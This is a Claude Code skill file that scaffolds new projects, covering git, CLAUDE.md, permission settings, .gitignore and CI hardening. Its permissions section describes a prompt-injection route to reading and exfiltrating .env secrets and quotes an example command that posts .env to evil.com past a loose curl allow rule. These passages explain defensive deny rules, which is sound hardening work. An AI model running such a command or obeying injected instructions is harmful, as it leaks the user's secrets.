---
name: init-project
description: Scaffold a new project in the current directory — git init, README.md, CLAUDE.md, AGENTS.md, Claude settings.json, linter/test config, unused-code detection (knip for TypeScript), runtime pin, lockfile (npm for TypeScript, uv for Python), supply-chain hardening (SHA-pinned GitHub Actions, least-privilege GITHUB_TOKEN, Dependabot cooldown, pinned container base images), and CI (GitHub Actions + Dependabot) for the specified language (TypeScript, Go, Python), plus optional Next.js boilerplate with error boundaries, security headers, SEO, and a health endpoint. Use this skill when the user wants to initialize or bootstrap a new project from scratch, set up a fresh repo, or scaffold project boilerplate.
allowed-tools: Bash(git init), Bash(git init *), Bash(git status *), Bash(git rev-parse *), Bash(git add *), Bash(git commit -m *), Bash(git ls-remote *), Bash(node -v), Bash(npm -v), Bash(npm view *), Bash(npm install *), Bash(npm run build*), Bash(npm run knip*), Bash(npm run lint*), Bash(npm run test:run*), Bash(npm run typecheck*), Bash(npx biome *), Bash(npx knip*), Bash(go mod init *), Bash(go vet *), Bash(go build *), Bash(go test *), Bash(go version), Bash(golangci-lint config verify*), Bash(golangci-lint run*), Bash(golangci-lint --version), Bash(uv --version), Bash(uv init *), Bash(uv python pin *), Bash(uv python list), Bash(uv add *), Bash(uv lock*), Bash(uv sync*), Bash(uv run ruff *), Bash(uv run mypy*), Bash(uv run pytest*), Bash(uv run vulture*), Bash(ls), Bash(ls *), Bash(tree), Bash(tree *), Bash(mkdir *), Bash(ln -s *), Read, Write, Edit, Glob, WebFetch(domain:github.com), WebFetch(domain:raw.githubusercontent.com)
---

## Instructions

Initialize a new project in the current directory. Ask the user for:

1. **Project name** — used in README.md heading and CLAUDE.md
2. **One-line description** — what this project does
3. **Primary language** — one of: `typescript`, `go`, `python`, or `next` for Next.js. Next.js is the only framework with its own scaffold; other framework answers (FastAPI, Gin, …) just select their language.
4. **Project type** — one of: `public-web` (public, indexable site), `internal-web` (internal tool / dashboard), `api` (backend/HTTP service, no browser UI), or `library`/`cli`. This gates the conditional steps: SEO scaffold (`public-web` only), security headers (any served web UI), and the health endpoint (`api` or any HTTP server).
5. **Service domain(s) and local dev port** — the domain(s) this project serves or calls (e.g. `example.com`, `api.example.com`) and the port the dev server listens on (e.g. `3000`). Used by the service-access permissions in Step 5. Ask only when the project type is not `library`/`cli`; accept "none" and skip that block if the user has no domain yet.

Then work through the steps below. **Skip any step where the file already exists — never overwrite.**

### Two rules that apply to every step

**Never copy a version number or SHA out of this skill.** Anything version-shaped in these files — `{tag}`, `{sha}`, `{exact current node version}`, `{installed-biome-version}` — is a placeholder to resolve at scaffold time, and any literal version in prose is there to explain a failure, not to be pinned. Resolve the current release yourself (`npm view <pkg> version`, `git ls-remote --tags`, `<tool> --version`), confirm it is problem-free by running the step's verification, and write *that* value into the project. A version baked into this skill is only as fresh as the last edit to it; a scaffold that pins it inherits that staleness on day one. The generated project pins hard — exact versions, SHAs, digests — precisely so that the resolving happens here, once, deliberately.

**Verify before moving on.** Each language reference ends with a verification block. A scaffold whose own toolchain does not pass is worse than no scaffold: it hands the user a broken baseline they will assume is correct.

### Language references

Read only the file(s) matching the intake answers — each is self-contained apart from the note below.

| Language / framework | Read |
|---|---|
| Plain TypeScript | `references/typescript.md` |
| Next.js | `references/typescript.md`, then `references/nextjs.md` |
| Go | `references/go.md` |
| Python | `references/python.md` |
| All of the above | `references/supply-chain.md` for CI, Dependabot, and pinning |

Each language reference covers that language's package/dependency setup, linter config, test config, unused-code detection, runtime pin, `.claude/settings.json` entries, and verification.

### Step 1: Git

Run `git rev-parse --is-inside-work-tree` to check. If not a git repo, run `git init`.

### Step 2: README.md

Create a minimal README:

```markdown
# {project-name}

{one-line description}
```

### Step 3: CLAUDE.md

Generate a project CLAUDE.md. The structure should be:

```markdown
# Project: {project-name}

{one-line description}

## Context

<!-- Why this project exists, key constraints, target users -->

## Structure

<!-- Will be filled as the project grows -->

## Development

### Setup

### Test

### Lint

### Build

## Implementation Plan

<!-- High-level milestones or phases -->

## Launch Readiness

<!-- Before going public, run /check-production-readiness for a full sweep.
     Not scaffolded here because each needs an account/DSN or app-specific values:
     - Error tracking (e.g. Sentry) on frontend + backend, with source-map upload.
     - Product analytics / metrics.
     - Content-Security-Policy: baseline security headers are scaffolded in next.config; a real
       nonce-based CSP is intentionally left as a TODO until script/style sources are known. -->
```

Fill in the Development section with concrete commands based on the language/framework chosen (e.g., `npm test`, `go test ./...`, `pytest`). Leave Context, Structure, and Implementation Plan as HTML comments for the user to fill in — these require human judgment.

Also record any constraint discovered during scaffolding that a future reader would otherwise undo — a dependency held back a major version, a linter rule that cannot be enabled yet. The language references call these out where they arise.

### Step 4: AGENTS.md

Create a symlink `AGENTS.md -> CLAUDE.md` so that other AI coding tools (e.g., GitHub Copilot) read the same project instructions:

```bash
ln -s CLAUDE.md AGENTS.md
```

### Step 5: .claude/settings.json

Create `.claude/settings.json` with permissions scoped to the project's language. Start from this base, then add the language-specific entries listed in the language reference:

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "permissions": {
    "deny": [
      "Read(.env)",
      "Read(.env.local)",
      "Read(.env.*.local)"
    ],
    "allow": []
  }
}
```

**Secrets — always deny, all languages.** This scaffold is agent-first, and every stack here reaches for a `.env` (Next.js is told outright to put real values there; Python uses `dotenv`, Go `godotenv`). Without a `deny` rule, a prompt-injection payload in any content Claude reads can have it `cat .env` and exfiltrate the secrets — an `allow` list doesn't stop that, because anything not allowed merely *prompts*, and an unattended or over-eager agent answers the prompt. `deny` is a no-prompt hard block that wins over both `ask` and `allow` ([precedence: deny → ask → allow](https://code.claude.com/docs/en/permissions)), and a `Read` deny also covers the file-reading Bash commands Claude Code recognizes (`cat`, `head`, `tail`, `sed`) and the `Edit` tool on the same path — so it closes the tool read, the shell read, and the overwrite in one rule.

Two boundaries to know so this isn't mistaken for more than it is:
- **`.env.example` is deliberately *not* denied.** It holds placeholders, not secrets, and the Next.js path has the agent create and append to it — a `Read(.env.*)` glob would block that `Edit` and hide the one env file meant to be read. gitignore-style patterns have no `!` negation and `deny` can't carry an allow exception, so the secret files are enumerated instead. If this project keeps secrets in a non-`.local` env file too (`.env.production`, `.env.staging`), add `Read(.env.production)` etc. — the enumerated list is the extension point.
- **It is not OS-level enforcement.** The deny stops Claude's own tools and recognized Bash file commands, but not an arbitrary subprocess that opens the file itself (a `node`/`python` one-liner). For a real boundary against exfiltration, [enable the sandbox](https://code.claude.com/docs/en/sandboxing); the deny rule is the cheap first layer, not the whole wall.

**Always include** (all languages):
- `Bash(git add *)`, `Bash(git commit -m *)`, `Bash(git diff*)`, `Bash(git log*)`, `Bash(git status*)`

**Service access** — add when the project has a domain or a dev server (skip for `library`/`cli`, and skip the domain entries if the user answered "none" in intake question 5). Substitute the real values from intake; add one `WebFetch`/`curl` pair per domain if there are several:
- `WebFetch(domain:{service-domain})` — lets Claude read the service's own pages without a prompt each time. The `domain:` prefix is required; a bare `WebFetch(example.com)` matches nothing.
- `Bash(curl * {service-domain}*)` — hitting the deployed service.
- `Bash(curl * localhost:{dev-port}*)` — hitting the local dev server.

Example for a Next.js app on `api.example.com` with the dev server on port 3000:

```json
"WebFetch(domain:api.example.com)",
"Bash(curl * api.example.com*)",
"Bash(curl * localhost:3000*)"
```

To cover subdomains, note that `WebFetch(domain:*.example.com)` matches `api.example.com` but **not** the apex `example.com` — list both when the project uses both.

The two `curl` patterns are deliberately loose, and this is a trade-off rather than a boundary. Claude Code matches `Bash(...)` against the whole command string, so `curl * api.example.com*` also allows a command that merely *mentions* the domain after another URL (`curl https://evil.com --data @.env api.example.com`). Tightening it to `Bash(curl -s https://api.example.com/*)` closes that hole but re-prompts whenever a flag is added or reordered — and per the [permissions docs](https://code.claude.com/docs/en/permissions), argument-constraining Bash patterns are fragile in both directions anyway (they miss `-X GET` before the URL, `https` vs `http`, `-L` redirects, and `$URL` variables). Since allowing `Bash` at all already lets Claude reach any URL via `curl`, treat these entries as prompt reduction for local development, not as network access control. If this project handles real secrets, enforce the boundary properly instead: deny `curl`/`wget` and route fetches through `WebFetch`, or validate URLs in a `PreToolUse` hook.

### Step 6: .gitignore

Create `.gitignore` **before** the language setup below runs — its content is fully determined by the intake language, and the next step's verification depends on it. `references/typescript.md` sets Biome's `useIgnoreFile: true`, making `.gitignore` the single source of truth for what tooling skips; the Next.js verification then runs `npm run build` (which populates `.next/` in-tree) *before* it lints. A `.gitignore` written any later would arrive too late, `biome check` would exit 1 on that generated output, and the fix an agent reaches for — a `biome.json` exclude — quietly undoes the single-source design. Creating it here also pre-covers Go's build artifacts and Python's `.venv`. (Step 1's `git init` must already have run — Biome resolves the VCS root from `.git/`.)

If `.gitignore` does not exist, create one. Every language gets:

```
.DS_Store
tmp/
.env*
!.env.example
```

Ignore `.env*` wholesale rather than only `.env*.local`. The Next.js reference scaffolds `.env.example` and tells the user to put real values in `.env`, so an ignore rule matching only `*.local` leaves the one file that actually holds secrets tracked — that is how a `.env` reaches a commit. The `!.env.example` negation keeps the committed template visible.

Then add the language-specific entries (from the reference you read for this language):

- **TypeScript**: `node_modules/`, `dist/`, `*.tsbuildinfo`
- **Next.js** (in addition to TypeScript): `.next/`, `out/`
- **Go** and **Python**: see their references.

### Step 7: Language setup

Follow the language reference from the table above — dependencies, linter, tests, unused-code detection, runtime pin, and its verification block. For a served web app or API, the reference also covers security headers, SEO, and the health endpoint.

**Work through each reference top to bottom; its section order is load-bearing.** The TypeScript path in particular must write `.npmrc` before installing anything, because npm applies those settings only to installs that run after the file exists.

### Step 8: CI & Dependabot

Follow `references/supply-chain.md`.

### Step 9: Summary

Run `tree -a -I '.git' --dirsfirst` and show the user what was created. List any files that were skipped because they already existed, and any constraint recorded in CLAUDE.md during Step 7.

### Step 10: Initial commit

Stage all created files and make an initial commit:

```bash
git add <all created files>
git commit -m "chore: scaffold project with initial config"
```

Only commit the files that were created by this skill. Do not use `git add .` or `git add -A`.

Commit **directly** with `git commit -m` here, even if the environment has a dedicated `commit` skill (a user's global instructions may prefer one). This is deliberate, not an oversight: init-project is a portable, self-contained skill that cannot assume another skill is installed, its `allowed-tools` scopes `git commit -m` for exactly this call, and the scaffold is a single deterministic commit that needs none of a commit skill's diff-reading or logical-splitting. Keep it direct.
